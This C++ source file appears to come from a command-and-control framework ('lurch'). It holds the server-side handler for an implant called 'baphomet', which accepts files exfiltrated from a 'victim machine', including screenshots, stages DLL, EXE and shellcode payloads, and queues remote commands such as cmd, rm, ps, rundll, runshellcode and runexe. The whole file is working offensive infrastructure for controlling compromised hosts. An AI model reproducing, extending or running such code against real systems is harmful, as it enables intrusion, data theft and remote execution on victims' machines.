//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>
#include <components.hpp>

lurch::result<std::filesystem::path>
lurch::baphomet::upload(const std::string &file, const std::string &extension) {

    //
    // if the file is prefixed with the "exfil stub" complete the top task.
    //

    if(file.starts_with("!!BAPHOMET_EXFIL!!")) {
        if(tasks.empty()) {
            return error("Exfiltrated file sent, but one was not expected.");
        }

        //
        // Edge case here.
        // If the result is for a screenshot, the file extension should be .bmp,
        // but it will arrive as .tmp because it's stored as a temporary file on the victim machine.
        //
        std::string ext = extension;
        if(tasks.back() == (std::string("screenshot") + AGENT_DELIMITING_CHAR)) {
            ext = "bmp";
        }

        tasks.pop();
        return inst->db.fileman_create(
            std::string_view(file.data() + 18, file.size() - 18),
            ext,
            id,
            true
        );
    }

    //
    // Otherwise, just stage the file. Only these file types are accepted.
    //

    if( extension != "dll"  &&
        extension != "exe"  &&
        extension != "bin"  &&
        extension != "o"    &&
        extension != "obj"
        ) {
        return error("invalid file type for this object.");
    }

    return inst->db.fileman_create(file, extension, id, true);
}


lurch::result<std::string>
lurch::baphomet::receive(reciever_context& ctx) {

    if(!commands.ready()) {
        init_commands();
    }

    if(!commands.matches(ctx.cmd)) {
        return error("invalid command or argument");
    }

    BAPHOMET_EXEC_IF_GET_TASK(ctx.cmd, ctx);
    BAPHOMET_EXEC_IF_COMPLETE_TASK(ctx.cmd);
    BAPHOMET_EXEC_IF_TASKS(ctx.cmd);
    BAPHOMET_EXEC_IF_CLEAR_TASKS(ctx.cmd);
    BAPHOMET_EXEC_IF_CD(ctx.cmd);
    BAPHOMET_EXEC_IF_CAT(ctx.cmd);
    BAPHOMET_EXEC_IF_MKDIR(ctx.cmd);
    BAPHOMET_EXEC_IF_RM(ctx.cmd);
    BAPHOMET_EXEC_IF_STAGED(ctx.cmd);
    BAPHOMET_EXEC_IF_PS(ctx.cmd);
    BAPHOMET_EXEC_IF_CMD(ctx.cmd);
    BAPHOMET_EXEC_IF_UPLOAD(ctx.cmd);
    BAPHOMET_EXEC_IF_RUNDLL(ctx.cmd);
    BAPHOMET_EXEC_IF_RUNSHELLCODE(ctx.cmd);
    BAPHOMET_EXEC_IF_RUNEXE(ctx.cmd);
    BAPHOMET_EXEC_IF_HELP(ctx.cmd, commands);

    if(ctx.cmd == "cp") {
        const auto [source, destination] =
            ctx.cmd.get<std::string>("--source", "-s")
                .with<std::string>("--destination", "-d")
                .done();

        return generic_queue_task(
            ctx.cmd,
            { *destination, *source },
            io::format_str("Successfully queued copy operation:\n{} -> {}", *destination, *source)
        );
    }

    //
    // For commands with no arguments
    //
    if(ctx.cmd.arguments.empty()) {
        tasks.push(ctx.cmd.name + AGENT_DELIMITING_CHAR);
        return {"successfully pushed task " + ctx.cmd.name};
    }

    return OBJECT_EMPTY_RESPONSE;
}